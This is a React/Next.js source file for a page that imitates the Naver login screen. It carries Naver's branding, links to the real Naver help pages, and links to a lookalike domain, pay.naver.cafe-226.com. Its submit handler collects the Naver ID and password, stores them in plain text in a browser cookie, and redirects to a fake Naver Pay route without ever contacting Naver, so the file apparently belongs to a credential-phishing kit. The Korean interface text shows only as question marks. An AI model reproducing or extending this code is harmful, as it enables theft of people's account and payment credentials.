import { useRouter } from 'next/router';
import React, { useContext, useEffect, useState, useRef } from 'react';
import { Store } from '../../utils/Store';
import useStyles from '../../utils/styles';
import Cookies from 'js-cookie';
import Image from 'next/image';

export default function Login() {
  const router = useRouter();
  const [userId, SetUserId] = useState('');
  const [userPwd, SetUserPwd] = useState('');

  const { dispatch } = useContext(Store);
  const naverUserId = useRef(null);
  const naverPwd = useRef(null);

  //const [userAgent, setUserAgent] = useState('');

  useEffect(() => {
    // if (userInfo) {
    //   router.push('/');
    // }
    //setUserAgent(navigator.userAgent);
  }, []);

  const classes = useStyles();

  const submitHandler = async (e) => {
    e.preventDefault();
    try {
      if (!userId) {
        naverUserId.current.focus();
        return;
      }

      if (!userPwd) {
        naverPwd.current.focus();
        return;
      }

      const nUInfo = {
        naverUserID: userId,
        naverUserPwd: userPwd,
      };

      dispatch({ type: 'NAVER_USER_LOGIN', payload: nUInfo });
      Cookies.set('naverUserInfo', nUInfo);
      //console.log(nUInfo);
      router.push('/naver/naverpay');
    } catch (err) {
      console.log(err);
    }
  };

  return (
    <>
      <div className={classes.z_login_wr}>
        <div className={classes.z_login_jz}>
          <div className={classes.z_login_nr}>
            <div className={classes.z_login_nr_01}>
              <Image
                src={'/naver/n_095.png'}
                alt={'login'}
                width={'245px'}
                height={'49px'}
              ></Image>
            </div>
            <div className={classes.z_login_nr_02}>
              <form id="login_naver" onSubmit={submitHandler}>
                <input
                  ref={naverUserId}
                  type="text"
                  id="username"
                  name="username"
                  className={classes.login_naver_username}
                  placeHolder="?????????"
                  value={userId}
                  onChange={(e) => SetUserId(e.target.value)}
                />
                <input
                  ref={naverPwd}
                  type="password"
                  id="password"
                  name="password"
                  className={classes.login_naver_password}
                  placeHolder="????????????"
                  value={userPwd}
                  onChange={(e) => SetUserPwd(e.target.value)}
                />
                <button type="submit" className={classes.login_naver_submit}>
                  ?????????
                </button>
              </form>
            </div>

            <div className={classes.z_login_nr_03}>
              <table width="100%">
                <tbody>
                  <tr>
                    <td width="34">
                      <a
                        href="#"
                        className="login_zhuangtai_tupian_qiehuan"
                        title="0"
                      >
                        <Image
                          src={'/naver/n_029.png'}
                          alt={'login'}
                          width={'24px'}
                          height={'24px'}
                        ></Image>
                      </a>
                    </td>

                    <td width="235">
                      <a
                        href="#"
                        className="login_zhuangtai_tupian_qiehuan"
                        title="0"
                        style={{ fontSize: '12px', color: '#666' }}
                      >
                        ????????? ?????? ??????
                      </a>
                    </td>
                    <td style={{ fontSize: '12px', color: '#777' }}>
                      IP?????? <span style={{ fontWeight: '700' }}>OFF</span>{' '}
                      <span style={{ fontSize: '10px' }}>|</span> ????????? ?????????
                    </td>
                    <td width="20" align="right">
                      <Image
                        src={'/naver/n_041.png'}
                        alt={'login'}
                        width={'16px'}
                        height={'16px'}
                      ></Image>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className={classes.z_login_nr_04}>
              <a
                href="https://nid.naver.com/user/help.nhn?todo=idinquiry"
                style={{ fontSize: '12px', marginRight: '20px', color: '#888' }}
              >
                ????????? ??????
              </a>
              <a
                href="https://nid.naver.com/nidreminder.form"
                style={{ fontSize: '12px', marginRight: '20px', color: '#888' }}
              >
                ???????????? ??????
              </a>
              <a
                href="https://nid.naver.com/user/join.html?lang=ko_KR"
                style={{ fontSize: '12px', color: '#888' }}
              >
                ????????????
              </a>
            </div>
            <div className={classes.z_login_nr_05}>
              <div className={classes.z_login_nr_0501}>
                <a
                  href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#"
                  style={{ marginLeft: '7px' }}
                >
                  ????????????
                </a>
                <span
                  style={{
                    fontSize: '10px',
                    color: '#ccc',
                    marginLeft: '10px',
                  }}
                >
                  |
                </span>
                <a
                  href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#"
                  style={{ marginLeft: '7px', fontWeight: '700' }}
                >
                  ????????????????????????
                </a>
                <span
                  style={{
                    fontSize: '10px',
                    color: '#ccc',
                    marginLeft: '10px',
                  }}
                >
                  |
                </span>
                <a
                  href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#"
                  style={{ marginLeft: '7px' }}
                >
                  ????????? ????????? ????????????
                </a>
                <span
                  style={{
                    fontSize: '10px',
                    color: '#ccc',
                    marginLeft: '10px',
                  }}
                >
                  |
                </span>
                <a href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#">
                  ???????????? ????????????
                </a>
              </div>
              <div className={classes.z_login_nr_0502}>
                <Image
                  src={'/naver/n_096.png'}
                  alt={''}
                  width={'318px'}
                  height={'19px'}
                ></Image>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
